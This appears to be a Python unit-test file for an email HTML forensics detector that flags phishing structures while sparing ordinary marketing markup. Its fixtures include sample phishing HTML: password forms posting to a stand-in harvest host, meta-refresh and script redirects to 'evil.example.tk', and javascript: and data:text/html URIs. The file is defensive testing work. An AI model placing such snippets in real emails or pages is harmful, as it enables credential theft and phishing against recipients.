"""Unit tests for HTML body forensics.

Two things are being protected here in equal measure: that the structural
threats an analyst cares about are actually detected, and that ordinary
commercial e-mail markup — preheaders, dark hero banners, spacer cells, Outlook
conditional comments, embedded logos — does not produce High findings. Nothing
in this module touches the network.
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../src')))

import html_analysis
from html_analysis import (
    ACTIVE_CONTENT, COMMENT_OBFUSCATION, CREDENTIAL_FORM, DATA_URI_HTML, DATA_URI_OTHER,
    ENTITY_OBFUSCATION, EVENT_HANDLER, FORM_CREDENTIAL_FIELDS, FORM_EXTERNAL_ACTION,
    HIDDEN_TEXT, IFRAME, IMAGE_ONLY_BODY, JAVASCRIPT_URI, META_REFRESH, SCRIPT,
    analyse_html,
)
from models import AuthVerdict, HtmlFinding, ParsedMessage, RoutingVerdict
from scoring import MAX_HTML_SCORE, MAX_HTML_SIGNALS, score_message


# A deliberately ordinary marketing message: stylesheet-hidden preheader padded
# with zero-width characters, an Outlook conditional comment, white text on a
# dark banner, a zero-height spacer cell, an embedded logo and a dozen links.
MARKETING_HTML = """<html>
<head><style>
  .preheader { display: none; font-size: 0; max-height: 0; }
  @media screen and (max-width: 600px) { .stack { width: 100% !important; } }
</style></head>
<body bgcolor="#f4f4f4">
  <div class="preheader">Your July product update is here&zwnj;&nbsp;""" \
    + "&zwnj;&nbsp;" * 150 + """</div>
  <!--[if mso]><table role="presentation"><tr><td><![endif]-->
  <table width="600" bgcolor="#ffffff">
    <tr><td style="background-color:#0b0f0d;color:#ffffff;padding:24px;">
      <h1>Acme Monthly</h1>
    </td></tr>
    <tr><td height="0" style="line-height:0;font-size:0;">&nbsp;</td></tr>
    <tr><td>
      <p>Hello Dana, here is everything the team shipped in July. We rebuilt the billing
         dashboard, shortened the onboarding flow to four steps, and published a new guide
         on capacity planning that walks through a worked example end to end.</p>
      <p>There is also a short interview with the platform team about how they cut deploy
         times in half, plus the usual round-up of smaller fixes and improvements.</p>
      """ + "".join(
    f'<a href="https://news.acme-example.com/story/{index}">Read story {index}</a> '
    for index in range(12)
) + """
      <img src="https://cdn.acme-example.com/logo.png" width="120" height="40" alt="Acme">
      <p style="font-size:11px;color:#888888;">You are receiving this because you have an
         Acme account. <a href="https://news.acme-example.com/unsubscribe">Unsubscribe</a></p>
    </td></tr>
  </table>
  <!--[if mso]></td></tr></table><![endif]-->
</body></html>"""


def categories(findings):
    return {finding.category for finding in findings}


def by_category(findings, category):
    return next((finding for finding in findings if finding.category == category), None)


def severities(findings, severity):
    return [finding for finding in findings if finding.severity == severity]


class TestCleanMarketingHtml(unittest.TestCase):
    """Ordinary bulk-mail markup must not be graded as a threat."""

    def setUp(self):
        self.findings = analyse_html(MARKETING_HTML, body_plain="Hello Dana, here is everything "
                                                               "the team shipped in July.")

    def test_no_high_severity_findings(self):
        self.assertEqual(severities(self.findings, "High"), [])

    def test_no_medium_severity_findings(self):
        self.assertEqual(severities(self.findings, "Medium"), [])

    def test_stylesheet_hidden_preheader_is_reported_as_low(self):
        hidden = by_category(self.findings, HIDDEN_TEXT)
        self.assertIsNotNone(hidden, "the hidden preheader should still be visible to the analyst")
        self.assertEqual(hidden.severity, "Low")

    def test_zero_width_padding_does_not_inflate_the_preheader(self):
        hidden = by_category(self.findings, HIDDEN_TEXT)
        self.assertLessEqual(html_analysis._meaningful_length(hidden.evidence), 400)
        self.assertEqual(hidden.severity, "Low")

    def test_outlook_conditional_comments_are_not_obfuscation(self):
        self.assertNotIn(COMMENT_OBFUSCATION, categories(self.findings))

    def test_white_text_on_a_dark_banner_is_not_cloaked(self):
        findings = analyse_html(
            '<td bgcolor="#0b0f0d"><span style="color:#ffffff">'
            + "Welcome back to Acme, your subscription renews next month and nothing needs "
              "your attention today. " * 6
            + "</span></td>"
        )
        self.assertNotIn(HIDDEN_TEXT, categories(findings))

    def test_embedded_logo_and_body_text_is_not_an_image_only_body(self):
        self.assertNotIn(IMAGE_ONLY_BODY, categories(self.findings))

    def test_many_links_do_not_produce_html_findings(self):
        self.assertNotIn(JAVASCRIPT_URI, categories(self.findings))
        self.assertNotIn(FORM_EXTERNAL_ACTION, categories(self.findings))


class TestHiddenText(unittest.TestCase):

    def test_substantial_cloaked_text_is_high(self):
        findings = analyse_html(
            '<div style="display:none">' + "lorem ipsum dolor sit amet " * 40 + "</div><p>Hi</p>"
        )
        hidden = by_category(findings, HIDDEN_TEXT)
        self.assertIsNotNone(hidden)
        self.assertEqual(hidden.severity, "High")
        self.assertIn("display:none", hidden.evidence)

    def test_mid_length_cloaked_text_is_medium(self):
        findings = analyse_html('<div style="font-size:0">' + "wordy " * 60 + "</div>")
        self.assertEqual(by_category(findings, HIDDEN_TEXT).severity, "Medium")

    def test_preheader_length_text_is_low(self):
        findings = analyse_html('<div style="display:none">Your receipt is attached</div>'
                                '<p>Thanks for your order.</p>')
        self.assertEqual(by_category(findings, HIDDEN_TEXT).severity, "Low")

    def test_white_on_white_text_is_detected(self):
        findings = analyse_html(
            '<div style="color:#ffffff;background-color:#ffffff">'
            + "invisible filler sentence " * 20 + "</div>"
        )
        hidden = by_category(findings, HIDDEN_TEXT)
        self.assertIsNotNone(hidden)
        self.assertIn("white", hidden.evidence.lower())

    def test_visibility_and_opacity_cloaking_are_detected(self):
        for style in ("visibility:hidden", "opacity:0", "mso-hide:all", "text-indent:-9999px"):
            findings = analyse_html(f'<div style="{style}">' + "filler text " * 40 + "</div>")
            self.assertIn(HIDDEN_TEXT, categories(findings), f"missed cloaking via {style}")

    def test_empty_hidden_spacer_produces_nothing(self):
        findings = analyse_html('<table><tr><td height="0" style="line-height:0">&nbsp;</td></tr>'
                                '</table><p>Real content here.</p>')
        self.assertNotIn(HIDDEN_TEXT, categories(findings))


class TestCredentialForms(unittest.TestCase):

    def test_password_input_is_high(self):
        findings = analyse_html(
            '<form action="http://harvest.example.tk/collect" method="post">'
            '<input type="text" name="username"><input type="password" name="pass">'
            '<input type="submit" value="Sign in"></form>'
        )
        form = by_category(findings, CREDENTIAL_FORM)
        self.assertIsNotNone(form)
        self.assertEqual(form.severity, "High")
        self.assertIn("harvest.example.tk", form.evidence)

    def test_card_details_without_a_password_field_still_report(self):
        findings = analyse_html('<form><input type="text" name="cc-number">'
                                '<input type="text" name="cvv"></form>')
        self.assertIn(CREDENTIAL_FORM, categories(findings))

    def test_external_form_action_alone_is_medium(self):
        findings = analyse_html('<form action="https://not-the-brand.example.tk/post">'
                                '<input type="text" name="feedback"></form>')
        action = by_category(findings, FORM_EXTERNAL_ACTION)
        self.assertIsNotNone(action)
        self.assertEqual(action.severity, "Medium")

    def test_single_email_field_is_not_reported(self):
        findings = analyse_html('<form><input type="text" name="email">'
                                '<input type="submit" value="Unsubscribe"></form>')
        self.assertNotIn(FORM_CREDENTIAL_FIELDS, categories(findings))
        self.assertNotIn(CREDENTIAL_FORM, categories(findings))

    def test_cluster_of_identity_fields_is_reported(self):
        findings = analyse_html('<form><input type="text" name="username">'
                                '<input type="text" name="account_number"></form>')
        self.assertIn(FORM_CREDENTIAL_FIELDS, categories(findings))


class TestActiveContent(unittest.TestCase):

    def test_script_block_is_detected(self):
        findings = analyse_html('<p>Hello</p><script>document.location="http://evil.example.tk"</script>')
        self.assertIn(SCRIPT, categories(findings))

    def test_script_body_is_not_counted_as_visible_text(self):
        findings = analyse_html('<div style="display:none">short</div>'
                                '<script>' + "var padding = 1; " * 50 + '</script>')
        self.assertEqual(by_category(findings, HIDDEN_TEXT).severity, "Low")

    def test_iframe_is_detected(self):
        findings = analyse_html('<iframe src="http://evil.example.tk/login"></iframe>')
        frame = by_category(findings, IFRAME)
        self.assertIsNotNone(frame)
        self.assertEqual(frame.severity, "Medium")

    def test_iframe_with_executable_source_is_high(self):
        findings = analyse_html('<iframe src="data:text/html;base64,PGZvcm0+"></iframe>')
        self.assertEqual(by_category(findings, IFRAME).severity, "High")

    def test_object_and_embed_are_detected(self):
        findings = analyse_html('<object data="http://evil.example.tk/x.swf"></object>')
        self.assertIn(ACTIVE_CONTENT, categories(findings))

    def test_meta_refresh_is_high(self):
        findings = analyse_html('<meta http-equiv="refresh" content="0;url=http://evil.example.tk/">')
        refresh = by_category(findings, META_REFRESH)
        self.assertIsNotNone(refresh)
        self.assertEqual(refresh.severity, "High")
        self.assertIn("evil.example.tk", refresh.evidence)

    def test_inline_event_handler_is_detected(self):
        findings = analyse_html('<a href="https://example.com" onclick="grab()">Click</a>')
        self.assertIn(EVENT_HANDLER, categories(findings))


class TestUriPayloads(unittest.TestCase):

    def test_data_text_html_is_high(self):
        findings = analyse_html('<a href="data:text/html;base64,PGZvcm0+">Open your invoice</a>')
        payload = by_category(findings, DATA_URI_HTML)
        self.assertIsNotNone(payload)
        self.assertEqual(payload.severity, "High")

    def test_data_javascript_is_high(self):
        findings = analyse_html('<a href="data:application/javascript,alert(1)">Open</a>')
        self.assertEqual(by_category(findings, DATA_URI_HTML).severity, "High")

    def test_embedded_images_are_not_flagged(self):
        findings = analyse_html(
            '<p>' + "Thanks for your order, the receipt is below. " * 6 + '</p>'
            '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">'
        )
        self.assertNotIn(DATA_URI_HTML, categories(findings))
        self.assertNotIn(DATA_URI_OTHER, categories(findings))

    def test_non_image_data_uri_is_medium(self):
        findings = analyse_html('<a href="data:application/octet-stream;base64,TVpQ">Download</a>')
        self.assertEqual(by_category(findings, DATA_URI_OTHER).severity, "Medium")

    def test_javascript_href_is_high(self):
        findings = analyse_html('<a href="javascript:void(location=\'http://evil.example.tk\')">Go</a>')
        payload = by_category(findings, JAVASCRIPT_URI)
        self.assertIsNotNone(payload)
        self.assertEqual(payload.severity, "High")


class TestObfuscation(unittest.TestCase):

    def test_comment_split_words_are_detected(self):
        findings = analyse_html('<p>Please conf<!-- x -->irm your pass<!---->word now</p>')
        self.assertIn(COMMENT_OBFUSCATION, categories(findings))

    def test_comments_between_tags_are_not_split_words(self):
        findings = analyse_html('<div><!-- header --><p>Hello there</p><!-- footer --></div>')
        self.assertNotIn(COMMENT_OBFUSCATION, categories(findings))

    def test_entity_encoded_words_are_detected(self):
        findings = analyse_html('<p>' + "&#118;&#101;&#114;&#105;&#102;&#121;" * 4 + '</p>')
        self.assertIn(ENTITY_OBFUSCATION, categories(findings))

    def test_ordinary_typography_entities_are_ignored(self):
        findings = analyse_html('<p>' + "It&#8217;s here.&#160;" * 20 + '</p>')
        self.assertNotIn(ENTITY_OBFUSCATION, categories(findings))


class TestImageOnlyBody(unittest.TestCase):

    def test_image_only_body_is_a_soft_signal(self):
        findings = analyse_html('<body><a href="http://evil.example.tk/x">'
                                '<img src="http://evil.example.tk/pixel.png"></a></body>')
        image_only = by_category(findings, IMAGE_ONLY_BODY)
        self.assertIsNotNone(image_only)
        self.assertEqual(image_only.severity, "Low")

    def test_a_plain_text_alternative_suppresses_the_signal(self):
        findings = analyse_html(
            '<body><img src="http://example.com/banner.png"></body>',
            body_plain="Your invoice for July is attached. " * 12,
        )
        self.assertNotIn(IMAGE_ONLY_BODY, categories(findings))


class TestGracefulDegradation(unittest.TestCase):

    def test_empty_and_missing_html_produces_nothing(self):
        for body in ("", "   ", "\n", None):
            self.assertEqual(analyse_html(body), [])

    def test_plain_text_only_message_produces_nothing(self):
        self.assertEqual(analyse_html("", body_plain="Just a plain text note."), [])

    def test_malformed_markup_does_not_raise(self):
        broken = ('<div style="display:none"><p>unclosed <b>bold <div><table><tr>'
                  '</span></p></div></body></html><<>>&#x;<form action=')
        self.assertIsInstance(analyse_html(broken), list)

    def test_unbalanced_end_tags_do_not_corrupt_hidden_tracking(self):
        findings = analyse_html('</div></span><div style="display:none">'
                                + "cloaked filler " * 60 + '</div></div></div><p>Visible.</p>')
        self.assertEqual(by_category(findings, HIDDEN_TEXT).severity, "High")

    def test_oversized_body_is_truncated_not_rejected(self):
        huge = '<p>padding</p>' * 200_000
        self.assertIsInstance(analyse_html(huge), list)

    def test_a_broken_parser_cannot_break_analysis(self):
        original = html_analysis._BodyScanner

        class Exploding(original):
            def feed(self, data):
                raise RuntimeError("parser blew up")

        html_analysis._BodyScanner = Exploding
        try:
            findings = analyse_html('<a href="javascript:alert(1)">x</a>')
        finally:
            html_analysis._BodyScanner = original
        # The tree walk failed, but the raw-text detectors still reported.
        self.assertIn(JAVASCRIPT_URI, categories(findings))

    def test_findings_are_ordered_strongest_first(self):
        findings = analyse_html(
            '<div style="display:none">preheader</div>'
            '<meta http-equiv="refresh" content="0;url=http://evil.example.tk/">'
            '<script>x()</script>'
        )
        order = [html_analysis.SEVERITY_ORDER[f.severity] for f in findings]
        self.assertEqual(order, sorted(order))


# --------------------------------------------------------------------------- #
# Scoring integration
# --------------------------------------------------------------------------- #


def _score(html_findings, parsed=None, routing=None):
    return score_message(
        parsed or ParsedMessage(from_raw="a@sender-domain.com", body_html="<p>hello</p>"),
        AuthVerdict(raw="", source="", spf="pass", dkim="pass", dmarc="pass"),
        routing or RoutingVerdict(hop_count=3),
        html_findings=html_findings,
    )


def _html_weight(verdict) -> int:
    return sum(s.weight for s in verdict.signals if s.indicator.startswith("HTML Forensics:"))


def _html_signals(verdict):
    return [s for s in verdict.signals if s.indicator.startswith("HTML Forensics:")]


class TestScoring(unittest.TestCase):

    def test_password_form_scores_heavily(self):
        verdict = _score([HtmlFinding(category=CREDENTIAL_FORM, indicator="Credential Form",
                                      severity="High", evidence="password field")])
        self.assertEqual(_html_weight(verdict), 30)
        self.assertEqual(_html_signals(verdict)[0].severity, "High")

    def test_low_severity_hidden_text_barely_scores(self):
        verdict = _score([HtmlFinding(category=HIDDEN_TEXT, indicator="Preheader",
                                      severity="Low", evidence="26 chars")])
        self.assertLessEqual(_html_weight(verdict), 5)
        self.assertEqual(verdict.risk_level, "Low")

    def test_severity_grades_the_same_category(self):
        low = _score([HtmlFinding(category=HIDDEN_TEXT, indicator="Preheader", severity="Low")])
        high = _score([HtmlFinding(category=HIDDEN_TEXT, indicator="Cloaked", severity="High")])
        self.assertLess(_html_weight(low), _html_weight(high))

    def test_total_contribution_is_capped(self):
        findings = [
            HtmlFinding(category=CREDENTIAL_FORM, indicator="Credential Form", severity="High"),
            HtmlFinding(category=DATA_URI_HTML, indicator="data: payload", severity="High"),
            HtmlFinding(category=META_REFRESH, indicator="Meta refresh", severity="High"),
            HtmlFinding(category=IFRAME, indicator="Iframe", severity="High"),
            HtmlFinding(category=HIDDEN_TEXT, indicator="Cloaked text", severity="High"),
            HtmlFinding(category=SCRIPT, indicator="Script", severity="Medium"),
            HtmlFinding(category=ACTIVE_CONTENT, indicator="Object", severity="Medium"),
            HtmlFinding(category=EVENT_HANDLER, indicator="onclick", severity="Medium"),
        ]
        verdict = _score(findings)
        self.assertLessEqual(_html_weight(verdict), MAX_HTML_SCORE)
        self.assertLessEqual(len(_html_signals(verdict)), MAX_HTML_SIGNALS)

    def test_html_findings_alone_never_reach_critical(self):
        findings = [
            HtmlFinding(category=CREDENTIAL_FORM, indicator="Credential Form", severity="High"),
            HtmlFinding(category=DATA_URI_HTML, indicator="data: payload", severity="High"),
            HtmlFinding(category=META_REFRESH, indicator="Meta refresh", severity="High"),
            HtmlFinding(category=IFRAME, indicator="Iframe", severity="High"),
        ]
        self.assertIn(_score(findings).risk_level, {"Low", "Medium"})

    def test_marketing_message_stays_low_risk_end_to_end(self):
        parsed = ParsedMessage(from_raw="news@acme-example.com", body_html=MARKETING_HTML,
                               body_plain="Hello Dana, here is everything the team shipped.")
        findings = analyse_html(parsed.body_html, parsed.body_plain)
        verdict = _score(findings, parsed)
        self.assertLessEqual(_html_weight(verdict), 5)
        self.assertEqual(verdict.risk_level, "Low")

    def test_unknown_category_is_bounded_by_its_severity(self):
        verdict = _score([HtmlFinding(category="a_detector_scoring_does_not_know",
                                      indicator="Future detector", severity="Medium")])
        self.assertLessEqual(_html_weight(verdict), 10)

    def test_no_findings_leaves_scoring_unchanged(self):
        parsed = ParsedMessage(from_raw="a@sender-domain.com", body_html="<p>hello</p>")
        auth = AuthVerdict(raw="", source="", spf="pass", dkim="pass", dmarc="pass")
        routing = RoutingVerdict(hop_count=3)
        baseline = score_message(parsed, auth, routing)
        analysed = score_message(parsed, auth, routing, html_findings=[])
        self.assertEqual(baseline.total_score, analysed.total_score)
        self.assertEqual(baseline.risk_level, analysed.risk_level)

    def test_structural_analysis_raises_confidence(self):
        parsed = ParsedMessage(from_raw="a@sender-domain.com", body_html="<p>hello</p>")
        auth = AuthVerdict(raw="", source="", spf="pass", dkim="pass", dmarc="pass")
        routing = RoutingVerdict(hop_count=1)
        without = score_message(parsed, auth, routing)
        with_html = score_message(parsed, auth, routing, html_findings=[])
        self.assertGreater(with_html.confidence, without.confidence)
        self.assertLessEqual(with_html.confidence, 90)

    def test_plain_text_message_is_not_penalised_for_absent_html(self):
        parsed = ParsedMessage(from_raw="a@sender-domain.com", body_plain="A plain note.")
        auth = AuthVerdict(raw="", source="", spf="pass", dkim="pass", dmarc="pass")
        routing = RoutingVerdict(hop_count=1)
        self.assertEqual(
            score_message(parsed, auth, routing).confidence,
            score_message(parsed, auth, routing, html_findings=[]).confidence,
        )

    def test_html_signals_form_their_own_evidence_family(self):
        from scoring import _signal_family
        self.assertEqual(_signal_family("HTML Forensics: Credential Harvesting Form"),
                         "html body forensics")

    def test_phishing_html_flows_through_scoring(self):
        body = ('<meta http-equiv="refresh" content="3;url=http://harvest.example.tk/">'
                '<div style="display:none">' + "benign filler words " * 40 + '</div>'
                '<form action="http://harvest.example.tk/collect">'
                '<input type="password" name="pass"></form>')
        parsed = ParsedMessage(from_raw="security@harvest.example.tk", body_html=body)
        findings = analyse_html(parsed.body_html)
        self.assertIn(CREDENTIAL_FORM, categories(findings))
        self.assertIn(META_REFRESH, categories(findings))
        self.assertIn(HIDDEN_TEXT, categories(findings))

        verdict = _score(findings, parsed)
        self.assertEqual(_html_weight(verdict), MAX_HTML_SCORE)
        self.assertIn(verdict.risk_level, {"Medium", "High", "Critical"})


if __name__ == "__main__":
    unittest.main()
